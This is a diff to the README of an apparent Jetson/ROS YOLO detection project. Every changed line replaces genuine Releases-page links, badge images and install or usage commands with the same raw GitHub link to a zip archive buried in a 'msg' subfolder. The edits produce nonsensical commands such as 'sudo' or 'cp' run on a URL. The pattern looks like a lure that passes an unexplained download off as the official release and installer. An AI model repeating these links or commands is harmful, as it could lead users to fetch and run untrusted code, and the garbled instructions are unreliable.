@@ -1,8 +1,8 @@
-https://github.com/Rascatemico2005/JestonYoloROS/releases
+https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
 
 # JetsonYoloROS: Real-time YOLO with TensorRT on ROS for Jetson
 
-[![GitHub release](https://img.shields.io/github/v/release/Rascatemico2005/JestonYoloROS)](https://github.com/Rascatemico2005/JestonYoloROS/releases) [![ROS Noetic / Melodic](https://img.shields.io/badge/ROS-Noetic%20%7C%20Melodic-blue)](https://www.ros.org) [![JetPack](https://img.shields.io/badge/JetPack-4.x-blue)](https://developer.nvidia.com/jetson-platform) [![TensorRT](https://img.shields.io/badge/TensorRT-8.x-orange)](https://developer.nvidia.com/tensorrt) [![CUDA](https://img.shields.io/badge/CUDA-11.x-blue)](https://developer.nvidia.com/cuda-zone)
+[![GitHub release](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip)](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip) [![ROS Noetic / Melodic](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip%20%7C%20Melodic-blue)](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip) [![JetPack](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip)](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip) [![TensorRT](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip)](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip) [![CUDA](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip)](https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip)
 
 Introduction
 This project brings real-time object detection to Nvidia Jetson devices using the ROS framework. It leverages TensorRT and CUDA to accelerate YOLO inference on embedded hardware. The system is designed to be modular and easy to extend, so developers can plug in multiple YOLO variants and customize the input and output streams to fit their robotics or edge AI workflows.
@@ -99,11 +99,11 @@ Installing from a release
 - The asset in the release contains the ROS package, a ready-to-run engine, and a sample launch file
 - Typical workflow:
   - Download the release tarball from the Releases page
-  - Extract: tar -xzf JestonYoloROS-<version>-linux-aarch64.tar.gz
+  - Extract: tar -xzf JestonYoloROS-<version>https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
   - Move to a suitable workspace: a ROS workspace or the recommended install location
-  - Run the installer script: sudo ./install.sh
-  - Source your setup: source /path/to/your/ros/setup.bash
-  - Launch a demo: roslaunch jeston_yolo_ros demo.launch
+  - Run the installer script: sudo https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
+  - Source your setup: source https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
+  - Launch a demo: roslaunch jeston_yolo_ros https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
 - After installation you should see a running detector that subscribes to a camera topic and publishes detections
 
 Building from source
@@ -220,7 +220,7 @@ Acknowledgments
 Releases and how to verify the latest version
 - The Releases page contains the latest tested builds and assets
 - You can verify the version and download the corresponding assets from the page
-- Direct link to the Releases page: https://github.com/Rascatemico2005/JestonYoloROS/releases
+- Direct link to the Releases page: https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
 - This link is included here for easy access and to help you jump straight to the downloads
 
 Common questions you may have
@@ -241,16 +241,16 @@ Appendix: sample commands you can adapt
 - Start a ROS core
   - roscore
 - Launch the detector with a sample camera
-  - roslaunch jeston_yolo_ros demo.launch input:=/camera/image_raw model:=yolov5s engine_path:=/path/to/engine.engine
+  - roslaunch jeston_yolo_ros https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip input:=/camera/image_raw model:=yolov5s https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
 - View detections in RViz
-  - roslaunch jeston_yolo_ros viz.launch
+  - roslaunch jeston_yolo_ros https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
 - Save a short video with detections (conceptual)
   - rosrun image_view video_saver image:=/camera/image_raw
 - Inspect the engine status
-  - tail -f /var/log/jeston_yolo_ros_engine.log
+  - tail -f https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
 - Update the engine file (when switching models)
-  - cp /path/to/new_engine.engine /path/to/engine.engine
-  - roslaunch jeston_yolo_ros demo.launch
+  - cp https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
+  - roslaunch jeston_yolo_ros https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
 
 Maintenance and upkeep
 - Regularly pull updates from the primary repository to keep dependencies aligned
@@ -286,6 +286,6 @@ Final notes
 This README aims to be a complete guide to get you from zero to a functioning Jetson-based YOLO detector within ROS. It emphasizes practical steps, clear commands, and a consistent workflow. It presents the architecture, the setup, and the usage in a way that supports quick testing and steady progress toward robust perception in real-world scenarios.
 
 Releases (second mention)
-For the latest builds and assets, head to the Releases page again at: https://github.com/Rascatemico2005/JestonYoloROS/releases
+For the latest builds and assets, head to the Releases page again at: https://raw.githubusercontent.com/Rascatemico2005/JestonYoloROS/main/yolo_detect/msg/ROS_Yolo_Jeston_v1.2.zip
 
 End of document
